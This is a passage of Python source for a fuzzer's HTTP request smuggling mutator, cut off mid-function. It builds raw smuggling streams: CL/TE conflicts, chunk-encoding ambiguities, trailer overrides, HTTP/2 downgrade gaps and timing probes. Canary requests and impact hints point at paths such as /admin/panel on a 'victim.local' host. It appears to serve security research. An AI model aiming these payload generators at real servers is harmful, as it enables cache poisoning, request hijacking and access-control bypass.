"""HTTP Request Smuggling mutator.

Phase 2 turns the mutator into a small parser-discrepancy exploration engine.
Inputs remain ASCII-safe raw request streams, but metadata now describes the
delivery and probe mode the target should use when transmitting them.

Phase 3 adds corpus-aware mutation: the mutator extracts structural fragments
from coverage-producing corpus seeds and splices them into freshly generated
templates.  A post-wire havoc pass applies controlled byte-level mutations to
non-metadata regions, breaking out of template fingerprint saturation.
"""

from __future__ import annotations

from dataclasses import dataclass, field
import random
import string
from typing import TYPE_CHECKING

from ...core.generator import GenerationError, Generator
from ..protocols import Input

if TYPE_CHECKING:
    from ...core.registry import GrammarRegistry
    from ..corpus import Seed


_LANES: dict[str, tuple[str, ...]] = {
    "h1_classic": (
        "cl_te",
        "te_cl",
        "te_te",
        "duplicate_cl",
        "duplicate_te",
        "cl_0",
        "0_cl",
        "te_0",
    ),
    "chunk_parser": (
        "chunk_ws",
        "chunk_ext",
        "chunk_bare_lf",
        "trailer_merge",
        "trailer_header_ambiguity",
        "chunk_terminator",
    ),
    "timing_probe": (
        "pause_prefix",
        "pause_suffix",
        "early_response",
        "connection_locked",
        "halfclose",
    ),
    "h2_downgrade": (
        "h2_cl",
        "h2_te",
        "h2_0",
        "h2_dup_authority",
        "h2_header_gap",
        "h2_end_stream_gap",
    ),
}

_ALL_FAMILIES = tuple(family for families in _LANES.values() for family in families)

_TAG_MAP: dict[str, tuple[str, ...]] = {
    "cl_te": ("CL.TE", "content_length", "transfer_encoding"),
    "te_cl": ("TE.CL", "content_length", "transfer_encoding"),
    "te_te": ("TE.TE", "duplicate_te", "te_obfuscation"),
    "duplicate_cl": ("CL.0", "duplicate_content_length"),
    "duplicate_te": ("TE.TE", "duplicate_transfer_encoding"),
    "cl_0": ("CL.0", "content_length_zero"),
    "0_cl": ("0.CL", "method_body_mismatch"),
    "te_0": ("TE.0", "zero_chunk_terminator"),
    "chunk_ws": ("TE.TE", "chunk_size_whitespace"),
    "chunk_ext": ("TE.TE", "chunk_extension"),
    "chunk_bare_lf": ("TE.TE", "bare_lf"),
    "trailer_merge": ("TE.TE", "trailer_merge"),
    "trailer_header_ambiguity": ("TE.TE", "trailer_header_ambiguity"),
    "chunk_terminator": ("TE.TE", "terminator_ambiguity"),
    "pause_prefix": ("CL.TE", "pause_probe", "prefix_split"),
    "pause_suffix": ("TE.CL", "pause_probe", "suffix_split"),
    "early_response": ("0.CL", "early_response_gadget", "pause_probe"),
    "connection_locked": ("CL.0", "connection_locked", "pause_probe"),
    "halfclose": ("CL.0", "half_close_probe"),
    "h2_cl": ("H2.CL", "downgrade", "content_length"),
    "h2_te": ("H2.TE", "downgrade", "transfer_encoding"),
    "h2_0": ("H2.0", "downgrade", "content_length_zero"),
    "h2_dup_authority": ("H2.CL", "duplicate_semantic_header", "authority_ambiguity"),
    "h2_header_gap": ("H2.TE", "downgrade_header_gap", "header_sanitation_gap"),
    "h2_end_stream_gap": ("H2.CL", "end_stream_gap", "downgrade"),
}

_STABLE_LANE_WEIGHTS = {
    "h1_classic": 0.38,
    "chunk_parser": 0.27,
    "timing_probe": 0.11,
    "h2_downgrade": 0.24,
}

_RESEARCH_MODE_WEIGHTS = {
    "framing_mode": {
        "CL": 0.34,
        "TE": 0.27,
        "0": 0.14,
        "H2": 0.25,
    },
    "length_conflict_mode": {
        "none": 0.08,
        "duplicate": 0.22,
        "mismatch": 0.32,
        "zero": 0.14,
        "downgrade": 0.24,
    },
    "header_leniency": {
        "strict": 0.25,
        "casing_mix": 0.15,
        "whitespace_before_colon": 0.16,
        "obs_fold": 0.14,
        "duplicate_resolution": 0.15,
        "forbidden_retention": 0.15,
    },
    "chunk_semantics": {
        "none": 0.30,
        "size_whitespace": 0.14,
        "chunk_extension": 0.14,
        "bare_lf": 0.12,
        "terminator_ambiguity": 0.10,
        "trailer_override_path": 0.10,
        "trailer_override_host": 0.10,
    },
    "connection_semantics": {
        "keepalive": 0.48,
        "close": 0.08,
        "reuse": 0.14,
        "halfclose": 0.10,
        "downgrade": 0.20,
    },
    "timing_semantics": {
        "none": 0.62,
        "pause_prefix": 0.11,
        "pause_suffix": 0.09,
        "early_response": 0.08,
        "partial_hold": 0.06,
        "halfclose": 0.04,
    },
    "routing_semantics": {
        "host": 0.28,
        "x_forwarded_host": 0.20,
        "x_original_url": 0.20,
        "authority_conflict": 0.18,
        "rewrite_path": 0.14,
    },
    "request_chain_shape": {
        "body_plus_canary": 0.45,
        "padding_plus_canary": 0.24,
        "trailers_plus_canary": 0.19,
        "split_canary": 0.12,
    },
}

_MODE_WEIGHTS = {
    "stable": (1.0, 0.0),
    "research": (0.0, 1.0),
    "hybrid": (0.45, 0.55),
}


def _rand_id(rng: random.Random) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(rng.choice(alphabet) for _ in range(10))


def _pick_weighted(rng: random.Random, weighted: dict[str, float]) -> str:
    names = tuple(weighted)
    weights = tuple(weighted[name] for name in names)
    return rng.choices(names, weights=weights, k=1)[0]


def _header_case(name: str, rng: random.Random) -> str:
    styles = (
        name,
        name.lower(),
        name.upper(),
        "-".join(part.capitalize() for part in name.split("-")),
    )
    return rng.choice(styles)


def _header_line(
    name: str,
    value: str,
    rng: random.Random,
    *,
    obs_fold: bool = False,
    whitespace_style: str | None = None,
) -> str:
    styles = (": ", ":\t", " : ", ":\x20")
    sep = whitespace_style or rng.choice(styles)
    line = f"{_header_case(name, rng)}{sep}{value}"
    if obs_fold:
        return line + "\r\n\t"
    return line


def _render_request(
    method: str,
    path: str,
    headers: list[str],
    body: bytes = b"",
    *,
    delimiter: bytes = b"\r\n",
) -> bytes:
    lines = [f"{method} {path} HTTP/1.1".encode("ascii")]
    lines.extend(line.encode("ascii") for line in headers)
    return delimiter.join(lines) + delimiter + delimiter + body


def _split_header_block(data: bytes) -> tuple[bytes, bytes, bytes]:
    if b"\r\n\r\n" in data:
        head, rest = data.split(b"\r\n\r\n", 1)
        return head, rest, b"\r\n"
    if b"\n\n" in data:
        head, rest = data.split(b"\n\n", 1)
        return head, rest, b"\n"
    raise ValueError("missing header terminator")


def _chunk_line(size_text: str, delimiter: bytes, data: bytes) -> bytes:
    return size_text.encode("ascii") + delimiter + data + delimiter


def _chunked(
    data: bytes,
    *,
    delimiter: bytes = b"\r\n",
    size_text: str | None = None,
    ext: str = "",
    trailers: list[bytes] | None = None,
    terminal: bytes | None = None,
) -> bytes:
    size = size_text or f"{len(data):X}"
    if ext:
        size += f";{ext}"
    body = _chunk_line(size, delimiter, data)
    body += b"0" + delimiter
    if trailers:
        for trailer in trailers:
            body += trailer + delimiter
    body += terminal if terminal is not None else delimiter
    return body


def _ascii_pad(rng: random.Random, length: int = 8) -> str:
    alphabet = string.ascii_letters + string.digits + "-_"
    return "".join(rng.choice(alphabet) for _ in range(length))


@dataclass(frozen=True)
class RequestStreamSpec:
    framing_mode: str
    length_conflict_mode: str
    header_leniency: str
    chunk_semantics: str
    connection_semantics: str
    timing_semantics: str
    routing_semantics: str
    request_chain_shape: str


@dataclass
class WireFragment:
    """Structural fragment extracted from a corpus seed's wire data."""

    family: str
    headers: list[bytes] = field(default_factory=list)
    body_region: bytes = b""
    trailers: list[bytes] = field(default_factory=list)
    delimiter: bytes = b"\r\n"


def _parse_wire_fragment(wire: bytes) -> WireFragment | None:
    """Extract mutable structural regions from a raw HTTP wire.

    Returns *None* when the wire cannot be parsed safely (malformed,
    missing canary, etc.) — callers must tolerate ``None``.
    """
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return None

    lines = head.split(delim)

    # Extract family from X-WF-Family header.
    family = "unknown"
    content_headers: list[bytes] = []
    for raw in lines[1:]:  # skip request line
        low = raw.lower()
        if low.startswith(b"x-wf-"):
            if low.startswith(b"x-wf-family:"):
                family = raw.split(b":", 1)[1].strip().decode("ascii", errors="replace")
            continue
        # Skip Host (set by template) and canary marker.
        if low.startswith(b"host:") or low.startswith(b"x-canary-request:"):
            continue
        if raw:
            content_headers.append(raw)

    # Locate canary boundary in body — everything before it is mutable.
    canary_marker = b"GET /__canary__/"
    canary_pos = body.find(canary_marker)
    body_region = body[:canary_pos] if canary_pos >= 0 else body

    # Extract trailers from chunk-encoded body: bytes between "0\r\n"
    # terminator and "\r\n\r\n" (or LF equivalents).
    trailers: list[bytes] = []
    zero_term = b"0" + delim
    zt_pos = body_region.find(zero_term)
    if zt_pos >= 0:
        trailer_block = body_region[zt_pos + len(zero_term):]
        # Strip final empty-line terminator.
        trailer_block = trailer_block.rstrip(b"\r\n")
        if trailer_block:
            trailers = [t for t in trailer_block.split(delim) if t.strip()]

    return WireFragment(
        family=family,
        headers=content_headers,
        body_region=body_region,
        trailers=trailers,
        delimiter=delim,
    )


class RequestSmugglingMutator:
    """Template-first parser discrepancy mutator for HRS."""

    name = "request_smuggling"

    def __init__(
        self,
        seed: int | None = None,
        registry: "GrammarRegistry | None" = None,
        grammar_name: str = "request_smuggling_stream",
        mode: str = "hybrid",
        havoc_intensity: float = 0.15,
    ) -> None:
        self.rng = random.Random(seed)
        self.registry = registry
        self.grammar_name = grammar_name
        self.mode = mode if mode in _MODE_WEIGHTS else "hybrid"
        self.generator = Generator(registry, seed=seed) if registry is not None else None
        self._havoc_intensity = max(0.0, min(1.0, havoc_intensity))
        # Coverage-weighted family frequency for corpus-aware biasing.
        self._family_hits: dict[str, int] = {f: 0 for f in _ALL_FAMILIES}

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        fragments = self._sample_fragments(corpus, k=5)
        lane_mode = self._pick_lane_mode(inp)
        if lane_mode == "stable":
            wire, meta, lane = self._mutate_stable(inp, fragments=fragments)
        else:
            wire, meta, lane = self._mutate_research(inp, fragments=fragments)
        # Post-wire havoc: apply controlled byte-level mutations to
        # non-metadata regions, breaking template fingerprint saturation.
        if self._havoc_intensity > 0.0 and self.rng.random() < 0.50:
            wire = self._wire_havoc(wire, intensity=self._havoc_intensity)
        return Input(
            data=wire,
            metadata={
                **inp.metadata,
                "mutator": self.name,
                "lane": lane,
                "request_smuggling_mode": lane_mode,
                **meta,
            },
        )

    # ------------------------------------------------------------------
    # Corpus fragment extraction & splicing
    # ------------------------------------------------------------------

    def _sample_fragments(self, corpus: list["Seed"], k: int = 5) -> list[WireFragment]:
        """Extract wire fragments from up to *k* random corpus seeds."""
        if not corpus or len(corpus) < 3:
            return []
        sample_size = min(k, len(corpus))
        fragments: list[WireFragment] = []
        for seed in self.rng.sample(corpus, sample_size):
            frag = _parse_wire_fragment(seed.input.data)
            if frag is None:
                continue
            fragments.append(frag)
            # Track family coverage contribution for biased selection.
            fset = getattr(seed, "feature_set", None)
            if fset:
                self._family_hits[frag.family] = (
                    self._family_hits.get(frag.family, 0) + len(fset)
                )
        return fragments

    def _splice_corpus_fragment(
        self,
        wire: bytes,
        fragment: WireFragment,
    ) -> bytes:
        """Splice mutable regions from *fragment* into *wire*.

        Preserves X-WF-* control headers and canary request.
        """
        try:
            head, body, delim = _split_header_block(wire)
        except ValueError:
            return wire

        lines = head.split(delim)
        request_line = lines[0] if lines else b""

        # Separate control vs content headers.
        control: list[bytes] = []
        content: list[bytes] = []
        for raw in lines[1:]:
            low = raw.lower()
            if low.startswith(b"x-wf-") or low.startswith(b"host:") or low.startswith(b"x-canary-request:"):
                control.append(raw)
            elif raw:
                content.append(raw)

        # Splice headers: replace content headers from fragment (30%).
        if fragment.headers and self.rng.random() < 0.30:
            content = list(fragment.headers)

        # Splice body region: replace pre-canary body (30%).
        canary_marker = b"GET /__canary__/"
        canary_pos = body.find(canary_marker)
        if canary_pos >= 0 and fragment.body_region and self.rng.random() < 0.30:
            body = fragment.body_region + body[canary_pos:]

        # Reassemble.
        new_lines = [request_line, *control, *content]
        return delim.join(new_lines) + delim + delim + body

    # ------------------------------------------------------------------
    # Post-wire havoc
    # ------------------------------------------------------------------

    def _wire_havoc(self, wire: bytes, intensity: float = 0.15) -> bytes:
        """Apply controlled byte-level mutations to non-metadata regions.

        Protected zones (never mutated):
        - All ``X-WF-*`` header lines.
        - The canary request block (``GET /__canary__/`` to end of
          canary's ``Connection: close\\r\\n\\r\\n``).
        """
        data = bytearray(wire)
        wire_len = len(data)
        if wire_len < 40:
            return wire

        # Build protected mask.
        protected = bytearray(wire_len)  # 0 = mutable, 1 = protected
        # Protect X-WF-* header lines.
        for marker in (b"X-WF-", b"x-wf-"):
            pos = 0
            while True:
                idx = wire.find(marker, pos)
                if idx < 0:
                    break
                # Find line start (after previous delimiter).
                line_start = wire.rfind(b"\n", 0, idx)
                line_start = (line_start + 1) if line_start >= 0 else idx
                # Find line end.
                line_end = wire.find(b"\n", idx)
                line_end = (line_end + 1) if line_end >= 0 else wire_len
                protected[line_start:line_end] = b"\x01" * (line_end - line_start)
                pos = line_end

        # Protect canary request block.
        canary_start = wire.find(b"GET /__canary__/")
        if canary_start >= 0:
            protected[canary_start:] = b"\x01" * (wire_len - canary_start)

        # Collect mutable offsets.
        mutable = [i for i in range(wire_len) if not protected[i]]
        if not mutable:
            return wire

        n_mutations = max(1, min(16, int(wire_len * intensity * 0.1)))

        for _ in range(n_mutations):
            idx = self.rng.choice(mutable)
            op = self.rng.random()

            if op < 0.30:
                # Byte flip.
                data[idx] ^= self.rng.randint(1, 255)
            elif op < 0.45:
                # Delimiter swap: \r\n <-> \n at this position.
                if idx < wire_len - 1 and data[idx] == 0x0D and data[idx + 1] == 0x0A:
                    # \r\n -> \n : remove \r.
                    data[idx:idx + 1] = b""
                    # Recompute: data length changed.
                    break  # single structural change per havoc
                elif data[idx] == 0x0A and (idx == 0 or data[idx - 1] != 0x0D):
                    # bare \n -> \r\n.
                    data[idx:idx] = b"\r"
                    break
            elif op < 0.60:
                # Header colon spacing: inject/remove space around ':'
                if data[idx] == ord(":") and idx > 0:
                    if idx + 1 < len(data) and data[idx + 1] == ord(" "):
                        data[idx + 1:idx + 2] = b"\t"
                    elif idx + 1 < len(data) and data[idx + 1] != ord(" "):
                        data[idx + 1:idx + 1] = b" "
                        break
            elif op < 0.75:
                # Casing toggle for ASCII letters.
                if 0x41 <= data[idx] <= 0x5A:
                    data[idx] |= 0x20
                elif 0x61 <= data[idx] <= 0x7A:
                    data[idx] &= ~0x20
            elif op < 0.85:
                # Chunk size hex digit tweak.
                if 0x30 <= data[idx] <= 0x39:  # '0'-'9'
                    data[idx] = self.rng.randint(0x30, 0x39)
                elif 0x41 <= data[idx] <= 0x46:  # 'A'-'F'
                    data[idx] = self.rng.randint(0x41, 0x46)
            else:
                # Whitespace injection.
                ws = self.rng.choice((b" ", b"\t", b" \t"))
                data[idx:idx] = ws
                break  # length changed

        result = bytes(data)
        # Safety check: if control headers got corrupted, revert.
        if b"X-WF-Request-ID:" not in result:
            return wire
        return result

    def _pick_lane_mode(self, inp: Input) -> str:
        hinted_mode = str(inp.metadata.get("request_smuggling_mode") or "").strip().lower()
        if hinted_mode in {"stable", "research"}:
            return hinted_mode
        stable_weight, research_weight = _MODE_WEIGHTS[self.mode]
        return self.rng.choices(
            ("stable", "research"),
            weights=(stable_weight, research_weight),
            k=1,
        )[0]

    def _mutate_stable(
        self, inp: Input, *, fragments: list[WireFragment] | None = None,
    ) -> tuple[bytes, dict[str, object], str]:
        family = self._pick_family(inp)
        lane = self._lane_for_family(family)
        request_id = _rand_id(self.rng)
        canary_path = f"/__canary__/{request_id}"
        meta = self._family_metadata(family, request_id=request_id, canary_path=canary_path)
        meta.update(self._axes_from_family(family))
        meta["stream_shape"] = self._stream_shape_for_family(family)
        meta["axis_projection"] = self._axis_projection(meta)
        wire = self._build_stream(
            family=family,
            request_id=request_id,
            canary_path=canary_path,
            meta=meta,
        )
        if fragments and self.rng.random() < 0.30:
            wire = self._splice_corpus_fragment(wire, self.rng.choice(fragments))
        return wire, meta, lane

    def _mutate_research(
        self, inp: Input, *, fragments: list[WireFragment] | None = None,
    ) -> tuple[bytes, dict[str, object], str]:
        spec = self._build_research_spec(inp)
        request_id = _rand_id(self.rng)
        canary_path = f"/__canary__/{request_id}"
        family = self._derive_variant_family(spec)
        meta = self._research_metadata(spec, request_id=request_id, canary_path=canary_path)
        baseline = self._baseline_components()
        wire = self._build_research_stream(
            spec,
            request_id=request_id,
            canary_path=canary_path,
            family=family,
            meta=meta,
            baseline=baseline,
        )
        if fragments and self.rng.random() < 0.30:
            wire = self._splice_corpus_fragment(wire, self.rng.choice(fragments))
        return wire, meta, "research"

    def _pick_family(self, inp: Input) -> str:
        hint = str(inp.metadata.get("variant_family", "")).strip().lower()
        if hint in _ALL_FAMILIES:
            return hint

        hinted_lane = str(inp.metadata.get("lane", "")).strip().lower()
        if hinted_lane in _LANES and self.rng.random() < 0.50:
            return self.rng.choice(_LANES[hinted_lane])

        if inp.data.startswith(b"PRI * HTTP/2.0"):
            return self.rng.choice(_LANES["h2_downgrade"])
        if (
            inp.metadata.get("transport_mode") == "h2_raw"
            or b"X-WF-Transport: h2_raw" in inp.data
            or b"X-WF-Family: h2_" in inp.data
        ):
            if self.rng.random() < 0.80:
                return self.rng.choice(_LANES["h2_downgrade"])

        # Corpus-biased selection: 40% chance when we have coverage data.
        total_hits = sum(self._family_hits.values())
        if total_hits > 0 and self.rng.random() < 0.40:
            weighted = {f: max(1, h) for f, h in self._family_hits.items()}
            return _pick_weighted(self.rng, weighted)

        lanes = tuple(_LANES)
        weights = tuple(_STABLE_LANE_WEIGHTS[lane] for lane in lanes)
        lane = self.rng.choices(lanes, weights=weights, k=1)[0]
        return self.rng.choice(_LANES[lane])

    def _build_research_spec(self, inp: Input) -> RequestStreamSpec:
        if inp.data.startswith(b"PRI * HTTP/2.0") or inp.metadata.get("transport_mode") == "h2_raw":
            framing_mode = "H2"
        else:
            framing_mode = _pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["framing_mode"])
        return RequestStreamSpec(
            framing_mode=framing_mode,
            length_conflict_mode=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["length_conflict_mode"]),
            header_leniency=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["header_leniency"]),
            chunk_semantics=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["chunk_semantics"]),
            connection_semantics=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["connection_semantics"]),
            timing_semantics=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["timing_semantics"]),
            routing_semantics=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["routing_semantics"]),
            request_chain_shape=_pick_weighted(self.rng, _RESEARCH_MODE_WEIGHTS["request_chain_shape"]),
        )

    @staticmethod
    def _lane_for_family(family: str) -> str:
        for lane, families in _LANES.items():
            if family in families:
                return lane
        return "h1_classic"

    def _research_metadata(
        self,
        spec: RequestStreamSpec,
        *,
        request_id: str,
        canary_path: str,
    ) -> dict[str, object]:
        family = self._derive_variant_family(spec)
        transport_mode = "h2_raw" if spec.framing_mode == "H2" else "h1_raw"
        delivery_mode = "oneshot_h1"
        probe_mode = "none"
        pause_ms = 0
        h2_mode = "none"
        h2_end_stream = "normal"

        if spec.timing_semantics in {"pause_prefix", "pause_suffix", "early_response", "partial_hold"}:
            delivery_mode = "pause_probe_h1"
            probe_mode = "early_response" if spec.timing_semantics == "partial_hold" else spec.timing_semantics
            pause_ms = self.rng.choice((90, 140, 220, 360))
        elif spec.connection_semantics == "halfclose" or spec.timing_semantics == "halfclose":
            delivery_mode = "halfclose_probe_h1"
            probe_mode = "halfclose"

        if spec.framing_mode == "H2" or spec.connection_semantics == "downgrade":
            delivery_mode = "h2_raw"
            h2_mode = {
                "downgrade": "header_sanitation_gap",
                "duplicate": "duplicate_authority",
                "mismatch": "content_length_mismatch",
                "zero": "zero_length_body",
            }.get(spec.length_conflict_mode, "content_length_mismatch")
            if spec.routing_semantics == "authority_conflict":
                h2_mode = "duplicate_authority"
            elif spec.length_conflict_mode == "downgrade":
                h2_mode = "header_sanitation_gap"
            elif spec.length_conflict_mode == "mismatch" and spec.chunk_semantics != "none":
                h2_mode = "forbidden_transfer_encoding"
            if spec.timing_semantics in {"early_response", "partial_hold"}:
                h2_end_stream = "headers_early"

        axis_meta = {
            "axis_framing": spec.framing_mode,
            "axis_leniency": spec.header_leniency,
            "axis_chunk": spec.chunk_semantics,
            "axis_connection": spec.connection_semantics,
            "axis_timing": spec.timing_semantics,
            "axis_routing": spec.routing_semantics,
            "stream_shape": spec.request_chain_shape,
        }
        return {
            "variant_family": family,
            "taxonomy_tags": self._taxonomy_from_spec(spec),
            "transport_mode": transport_mode,
            "delivery_mode": delivery_mode,
            "probe_mode": probe_mode,
            "pause_ms": pause_ms,
            "chunk_shape": spec.chunk_semantics,
            "h2_mode": h2_mode,
            "h2_end_stream": h2_end_stream,
            "impact_hint": self._impact_hint_from_spec(spec),
            "canary_path": canary_path,
            "request_id": request_id,
            **axis_meta,
            "axis_projection": self._axis_projection(axis_meta),
        }

    def _axes_from_family(self, family: str) -> dict[str, object]:
        mapping = {
            "cl_te": ("CL", "strict", "none", "keepalive", "none", "host"),
            "te_cl": ("TE", "strict", "none", "keepalive", "none", "host"),
            "te_te": ("TE", "obs_fold", "none", "keepalive", "none", "host"),
            "duplicate_cl": ("CL", "strict", "none", "keepalive", "none", "x_original_url"),
            "duplicate_te": ("TE", "duplicate_resolution", "none", "keepalive", "none", "x_original_url"),
            "cl_0": ("CL", "strict", "none", "keepalive", "none", "x_original_url"),
            "0_cl": ("0", "whitespace_before_colon", "none", "keepalive", "none", "host"),
            "te_0": ("TE", "strict", "none", "keepalive", "none", "host"),
            "chunk_ws": ("TE", "strict", "size_whitespace", "keepalive", "none", "host"),
            "chunk_ext": ("TE", "strict", "chunk_extension", "keepalive", "none", "host"),
            "chunk_bare_lf": ("TE", "strict", "bare_lf", "keepalive", "none", "host"),
            "trailer_merge": ("TE", "strict", "trailer_override_path", "keepalive", "none", "x_original_url"),
            "trailer_header_ambiguity": ("TE", "strict", "trailer_override_host", "keepalive", "none", "authority_conflict"),
            "chunk_terminator": ("TE", "strict", "terminator_ambiguity", "keepalive", "none", "host"),
            "pause_prefix": ("CL", "strict", "none", "reuse", "pause_prefix", "host"),
            "pause_suffix": ("TE", "strict", "none", "reuse", "pause_suffix", "host"),
            "early_response": ("0", "strict", "none", "reuse", "early_response", "rewrite_path"),
            "connection_locked": ("CL", "strict", "none", "reuse", "partial_hold", "host"),
            "halfclose": ("CL", "strict", "none", "halfclose", "halfclose", "host"),
            "h2_cl": ("H2", "strict", "none", "downgrade", "none", "x_original_url"),
            "h2_te": ("H2", "forbidden_retention", "none", "downgrade", "none", "host"),
            "h2_0": ("H2", "strict", "none", "downgrade", "none", "host"),
            "h2_dup_authority": ("H2", "duplicate_resolution", "none", "downgrade", "none", "authority_conflict"),
            "h2_header_gap": ("H2", "forbidden_retention", "none", "downgrade", "none", "rewrite_path"),
            "h2_end_stream_gap": ("H2", "strict", "none", "downgrade", "early_response", "host"),
        }
        framing, leniency, chunk, connection, timing, routing = mapping.get(
            family, ("CL", "strict", "none", "reuse", "none", "host")
        )
        return {
            "axis_framing": framing,
            "axis_leniency": leniency,
            "axis_chunk": chunk,
            "axis_connection": connection,
            "axis_timing": timing,
            "axis_routing": routing,
        }

    def _stream_shape_for_family(self, family: str) -> str:
        if family in {"trailer_merge", "trailer_header_ambiguity"}:
            return "trailers_plus_canary"
        if family in {"pause_prefix", "pause_suffix", "early_response", "connection_locked", "halfclose"}:
            return "split_canary"
        if family in {"duplicate_cl", "cl_0", "0_cl"}:
            return "padding_plus_canary"
        return "body_plus_canary"

    def _derive_variant_family(self, spec: RequestStreamSpec) -> str:
        if spec.framing_mode == "H2":
            if spec.routing_semantics == "authority_conflict":
                return "h2_dup_authority"
            if spec.length_conflict_mode == "downgrade":
                return "h2_header_gap"
            if spec.timing_semantics in {"early_response", "partial_hold"}:
                return "h2_end_stream_gap"
            if spec.length_conflict_mode == "zero":
                return "h2_0"
            if spec.length_conflict_mode == "mismatch" and spec.chunk_semantics != "none":
                return "h2_te"
            return "h2_cl"
        if spec.chunk_semantics == "trailer_override_path":
            return "trailer_merge"
        if spec.chunk_semantics == "trailer_override_host":
            return "trailer_header_ambiguity"
        if spec.chunk_semantics == "bare_lf":
            return "chunk_bare_lf"
        if spec.chunk_semantics == "chunk_extension":
            return "chunk_ext"
        if spec.chunk_semantics == "size_whitespace":
            return "chunk_ws"
        if spec.chunk_semantics == "terminator_ambiguity":
            return "chunk_terminator"
        if spec.timing_semantics == "pause_prefix":
            return "pause_prefix"
        if spec.timing_semantics == "pause_suffix":
            return "pause_suffix"
        if spec.timing_semantics == "early_response":
            return "early_response"
        if spec.connection_semantics == "halfclose" or spec.timing_semantics == "halfclose":
            return "halfclose"
        if spec.timing_semantics == "partial_hold":
            return "connection_locked"
        if spec.framing_mode == "TE":
            if spec.length_conflict_mode == "duplicate":
                return "duplicate_te"
            if spec.length_conflict_mode == "zero":
                return "te_0"
            if spec.length_conflict_mode == "mismatch":
                return "te_cl"
            return "te_te"
        if spec.framing_mode == "0":
            return "0_cl"
        if spec.length_conflict_mode == "duplicate":
            return "duplicate_cl"
        if spec.length_conflict_mode == "zero":
            return "cl_0"
        return "cl_te"

    def _taxonomy_from_spec(self, spec: RequestStreamSpec) -> list[str]:
        family = self._derive_variant_family(spec)
        tags = [f"framing={spec.framing_mode}", f"length={spec.length_conflict_mode}", spec.routing_semantics]
        if spec.header_leniency != "strict":
            tags.append(spec.header_leniency)
        if spec.chunk_semantics != "none":
            tags.append(spec.chunk_semantics)
        if spec.connection_semantics != "keepalive":
            tags.append(spec.connection_semantics)
        if spec.timing_semantics != "none":
            tags.append(spec.timing_semantics)
        return list(dict.fromkeys((*_TAG_MAP.get(family, (family,)), *tags)))

    def _impact_hint_from_spec(self, spec: RequestStreamSpec) -> str:
        if spec.routing_semantics in {"x_original_url", "rewrite_path"} or spec.chunk_semantics == "trailer_override_path":
            return "/cache/store"
        if spec.routing_semantics == "authority_conflict" or spec.chunk_semantics == "trailer_override_host":
            return "/admin/panel"
        if spec.timing_semantics in {"early_response", "partial_hold"}:
            return "/early"
        if spec.length_conflict_mode == "zero":
            return "/reflect/prefix"
        return "/queue/append"

    def _axis_projection(self, meta: dict[str, object]) -> str:
        return (
            f"framing={meta.get('axis_framing', 'unknown')}"
            f"|leniency={meta.get('axis_leniency', 'unknown')}"
            f"|chunk={meta.get('axis_chunk', 'unknown')}"
            f"|connection={meta.get('axis_connection', 'unknown')}"
            f"|timing={meta.get('axis_timing', 'unknown')}"
            f"|routing={meta.get('axis_routing', 'unknown')}"
            f"|shape={meta.get('stream_shape', 'unknown')}"
        )

    def _baseline_components(self) -> dict[str, object]:
        generated = ""
        if self.generator is not None:
            try:
                generated = self.generator.generate(self.grammar_name, "baseline_stream")
            except (GenerationError, ValueError):
                generated = ""
        if generated:
            try:
                head, body, delim = _split_header_block(generated.encode("latin-1", errors="replace"))
                lines = head.split(delim)
                request_line = lines[0].decode("latin-1", errors="replace").split()
                method = request_line[0] if request_line else "POST"
                path = request_line[1] if len(request_line) > 1 else "/queue/append"
                headers = [
                    raw.decode("latin-1", errors="replace")
                    for raw in lines[1:]
                    if not raw.decode("latin-1", errors="replace").lower().startswith("x-wf-")
                ]
                return {
                    "method": method,
                    "path": path,
                    "headers": headers,
                    "body": body,
                    "delimiter": delim,
                }
            except ValueError:
                pass
        return {
            "method": "POST",
            "path": "/queue/append",
            "headers": [
                "Host: victim.local",
                "User-Agent: wf-hrs/3.0",
                "Connection: keep-alive",
            ],
            "body": b"seed=baseline",
            "delimiter": b"\r\n",
        }

    def _family_metadata(
        self,
        family: str,
        *,
        request_id: str,
        canary_path: str,
    ) -> dict[str, object]:
        lane = self._lane_for_family(family)
        transport_mode = "h2_raw" if lane == "h2_downgrade" else "h1_raw"
        delivery_mode = "oneshot_h1"
        probe_mode = "none"
        pause_ms = 0
        chunk_shape = "none"
        h2_mode = "none"
        h2_end_stream = "normal"
        impact_hint = "none"

        if lane == "timing_probe":
            pause_ms = self.rng.choice((120, 180, 250, 400))
            if family == "halfclose":
                delivery_mode = "halfclose_probe_h1"
                probe_mode = "halfclose"
            else:
                delivery_mode = "pause_probe_h1"
                probe_mode = family
        elif lane == "h2_downgrade":
            delivery_mode = "h2_raw"
            h2_mode_map = {
                "h2_cl": "content_length_mismatch",
                "h2_te": "forbidden_transfer_encoding",
                "h2_0": "zero_length_body",
                "h2_dup_authority": "duplicate_authority",
                "h2_header_gap": "header_sanitation_gap",
                "h2_end_stream_gap": "end_stream_gap",
            }
            h2_mode = h2_mode_map.get(family, family)
            if family == "h2_end_stream_gap":
                h2_end_stream = "headers_early"
        elif lane == "chunk_parser":
            chunk_shape = family

        impact_hint_map = {
            "cl_te": "/queue/append",
            "te_cl": "/queue/append",
            "te_te": "/queue/append",
            "duplicate_cl": "/cache/store",
            "duplicate_te": "/cache/store",
            "cl_0": "/cache/store",
            "0_cl": "/reflect/prefix",
            "te_0": "/queue/append",
            "chunk_ws": "/reflect/prefix",
            "chunk_ext": "/reflect/prefix",
            "chunk_bare_lf": "/reflect/prefix",
            "trailer_merge": "/cache/store",
            "trailer_header_ambiguity": "/admin/panel",
            "chunk_terminator": "/queue/append",
            "pause_prefix": "/queue/append",
            "pause_suffix": "/queue/append",
            "early_response": "/early",
            "connection_locked": "/queue/append",
            "halfclose": "/queue/append",
            "h2_cl": "/cache/store",
            "h2_te": "/queue/append",
            "h2_0": "/reflect/prefix",
            "h2_dup_authority": "/admin/panel",
            "h2_header_gap": "/cache/store",
            "h2_end_stream_gap": "/queue/append",
        }
        impact_hint = impact_hint_map.get(family, "/queue/append")

        return {
            "variant_family": family,
            "taxonomy_tags": list(_TAG_MAP.get(family, (family,))),
            "transport_mode": transport_mode,
